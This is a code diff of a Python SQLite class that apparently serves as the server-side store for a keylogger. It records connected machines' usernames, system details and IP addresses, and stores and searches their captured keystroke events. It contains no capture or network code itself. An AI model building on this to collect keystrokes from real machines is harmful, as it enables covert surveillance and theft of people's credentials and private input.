@@ -1,6 +1,4 @@
 import sqlite3
-from typing import List
-
 
 class DB:
     conn = None
@@ -13,37 +11,28 @@ class DB:
         self._create_table()
 
     def _create_table(self):
-        # CREATE TABLE IF NOT EXISTS logs (
-        #                 id INTEGER PRIMARY KEY AUTOINCREMENT,
-        #                 timestamp TEXT NOT NULL,
-        #                 keylog TEXT NOT NULL,
-        #                 username TEXT NOT NULL,
-        #                 machine TEXT NOT NULL DEFAULT 'unknown'
-        #             )
-        self.cursor.execute('''
-            
-            CREATE TABLE IF NOT EXISTS connections (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                status TEXT DEFAULT 'active',
-                timestamp INTEGER NOT NULL,
-                username TEXT,
-                processor TEXT,
-                system TEXT,
-                node TEXT,
-                release TEXT,
-                version TEXT,
-                machine TEXT,
-                ip_address TEXT      
-            )
-        ''')
-        self.conn.commit()
+        self.cursor.execute('''CREATE TABLE IF NOT EXISTS connections (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  status TEXT DEFAULT 'active',
+  timestamp INTEGER NOT NULL,
+  username TEXT,
+  processor TEXT,
+  system TEXT,
+  node TEXT,
+  release TEXT,
+  version TEXT,
+  machine TEXT,
+  ip_address TEXT
+);''')
 
-    def insert_log(self, timestamp, events: List[str], username: str, machine: str):
-        keylog = ''.join(events)
-        self.cursor.execute('''
-            INSERT INTO logs (timestamp, keylog, username, machine)
-            VALUES (?, ?, ?, ?)
-        ''', (timestamp, keylog, username, machine))
+        self.cursor.execute('''CREATE TABLE IF NOT EXISTS events (
+  id INTEGER PRIMARY KEY AUTOINCREMENT,
+  timestmp INTEGER NOT NULL,
+  event TEXT NOT NULL,
+  connection_id INTEGER,
+  FOREIGN KEY(connection_id) REFERENCES connections(id)
+);
+''')
         self.conn.commit()
 
     def init_connection(self, timestamp, username, processor, system, node, release, version, machine, ip_address):
@@ -62,132 +51,101 @@ class DB:
         ''', (connection_id,))
         self.conn.commit()
 
-    def fetch_logs(self, offset=0, limit=None):
-        query = 'SELECT * FROM logs ORDER BY timestamp DESC'
-        params = []
-
-        if limit is not None:
-            query += ' LIMIT ? OFFSET ?'
-            params.extend([limit, offset])
-
-        with self.conn:
-            cursor = self.conn.cursor()
-            cursor.execute(query, params)
-            return [dict(row) for row in cursor.fetchall()]
-
-    def get_by_username(self, username: str, offset=0, limit=None):
-        query = 'SELECT * FROM logs WHERE username = ? ORDER BY timestamp DESC'
-        params = [username]
-
-        if limit is not None:
-            query += ' LIMIT ? OFFSET ?'
-            params.extend([limit, offset])
-
-        with self.conn:
-            cursor = self.conn.cursor()
-            cursor.execute(query, params)
-            return [dict(row) for row in cursor.fetchall()]
-
-    def get_all_usernames(self, offset=0, limit=None):
-        query = 'SELECT DISTINCT username FROM logs'
-        params = []
-
-        if limit is not None:
-            query += ' LIMIT ? OFFSET ?'
-            params.extend([limit, offset])
-
-        with self.conn:
-            cursor = self.conn.cursor()
-            cursor.execute(query, params)
-            return [row[0] for row in cursor.fetchall()]
-
-    def get_all_machines(self, offset=0, limit=None):
-        query = 'SELECT DISTINCT machine FROM logs'
-        params = []
-
-        if limit is not None:
-            query += ' LIMIT ? OFFSET ?'
-            params.extend([limit, offset])
-
-        with self.conn:
-            cursor = self.conn.cursor()
-            cursor.execute(query, params)
-            return [row[0] for row in cursor.fetchall()]
-
-    def get_by_machine(self, machine: str, offset=0, limit=None):
-        query = 'SELECT * FROM logs WHERE machine = ? ORDER BY timestamp DESC'
-        params = [machine]
-
-        if limit is not None:
-            query += ' LIMIT ? OFFSET ?'
-            params.extend([limit, offset])
-
-        with self.conn:
-            cursor = self.conn.cursor()
-            cursor.execute(query, params)
-            return [dict(row) for row in cursor.fetchall()]
-
-    def get_by_date_range(self, start_date: str, end_date: str, offset=0, limit=None):
-        query = 'SELECT * FROM logs WHERE DATE(timestamp) BETWEEN DATE(?) AND DATE(?) ORDER BY timestamp DESC'
-        params = [start_date, end_date]
-
-        if limit is not None:
-            query += ' LIMIT ? OFFSET ?'
-            params.extend([limit, offset])
-
-        with self.conn:
-            cursor = self.conn.cursor()
-            cursor.execute(query, params)
-            return [dict(row) for row in cursor.fetchall()]
-
-    def search_text(self, query: str, offset=0, limit=None):
-        sql_query = 'SELECT * FROM logs WHERE keylog LIKE ? ORDER BY timestamp DESC'
-        params = [f'%{query}%']
-
-        if limit is not None:
-            sql_query += ' LIMIT ? OFFSET ?'
-            params.extend([limit, offset])
-
-        with self.conn:
-            cursor = self.conn.cursor()
-            cursor.execute(sql_query, params)
-            return [dict(row) for row in cursor.fetchall()]
-
-    def delete_log(self, log_id: int):
-        self.cursor.execute('DELETE FROM logs WHERE id = ?', (log_id,))
+    def insert_log(self, connection_id: int, timestamp: int, events: str):
+        self.cursor.execute('''
+            INSERT INTO events (timestmp, event, connection_id)
+            VALUES (?, ?, ?)
+        ''', (timestamp, str(events), connection_id))
         self.conn.commit()
 
-    def close(self):
-        self.conn.close()
+    def delete_log(self, log_id: int):
+        self.cursor.execute('''
+            DELETE FROM events
+            WHERE id = ?
+        ''', (log_id,))
+        self.conn.commit()
 
-    def fetch_logs_filtered(self, username=None, machine=None, start_date=None, end_date=None, search_query=None, offset=0, limit=None):
-        query = 'SELECT * FROM logs WHERE 1=1'
+    def delete_connection(self, connection_id: int):
+        self.cursor.execute('''
+            DELETE FROM connections
+            WHERE id = ?
+        ''', (connection_id,))
+        self.conn.commit()
+
+
+    def get_connections(self,
+                        status=None,
+                        offset=0,
+                        limit=None,
+                        username=None,
+                        machine=None,
+                        start_date=None,
+                        end_date=None):
+        query = "SELECT * FROM connections WHERE 1=1"
         params = []
-        
-        if username:
-            query += ' AND username = ?'
-            params.append(username)
-        
-        if machine:
-            query += ' AND machine = ?'
-            params.append(machine)
-        
-        if start_date and end_date:
-            query += ' AND datetime(timestamp) BETWEEN datetime(?) AND datetime(?)'
-            params.extend([start_date, end_date])
-        
-        if search_query:
-            query += ' AND keylog LIKE ?'
-            params.append(f'%{search_query}%')
-        
-        query += ' ORDER BY timestamp DESC'
-        
-        if limit is not None:
-            query += ' LIMIT ? OFFSET ?'
-            params.extend([limit, offset])
-        
-        with self.conn:
-            cursor = self.conn.cursor()
-            cursor.execute(query, params)
-            return [dict(row) for row in cursor.fetchall()]
 
+        if username:
+            query += " AND username = ?"
+            params.append(username)
+        if machine:
+            query += " AND machine = ?"
+            params.append(machine)
+        if start_date:
+            query += " AND timestamp >= ?"
+            params.append(start_date)
+        if end_date:
+            query += " AND timestamp <= ?"
+            params.append(end_date)
+
+        if status:
+            query += " AND status = ?"
+            params.append(status)
+
+        query += " ORDER BY timestamp DESC"
+
+        if limit is not None:
+            query += " LIMIT ?"
+            params.append(limit)
+        if offset:
+            query += " OFFSET ?"
+            params.append(offset)
+
+        self.cursor.execute(query, params)
+        rows = self.cursor.fetchall()
+        return [dict(row) for row in rows]
+
+    def get_connection_by_id(self, connection_id: int):
+        # return the connection and its events count and last event date
+        self.cursor.execute('''
+            SELECT c.*, 
+                   (SELECT COUNT(*) FROM events e WHERE e.connection_id = c.id) AS event_count,
+                   (SELECT MAX(timestmp) FROM events e WHERE e.connection_id = c.id) AS last_event_date
+            FROM connections c
+            WHERE c.id = ?
+        ''', (connection_id,))
+        row = self.cursor.fetchone()
+        return dict(row) if row else None
+
+    def get_events_by_connection(self, connection_id: int, offset=0, limit=None, start_date=None,end_date=None):
+        query = "SELECT * FROM events WHERE connection_id = ?"
+        params = [connection_id]
+
+        if start_date:
+            query += " AND timestmp >= ?"
+            params.append(start_date)
+        if end_date:
+            query += " AND timestmp <= ?"
+            params.append(end_date)
+
+        query += " ORDER BY timestmp DESC"
+
+        if limit is not None:
+            query += " LIMIT ?"
+            params.append(limit)
+        if offset:
+            query += " OFFSET ?"
+            params.append(offset)
+
+        self.cursor.execute(query, params)
+        rows = self.cursor.fetchall()
+        return [dict(row) for row in rows]
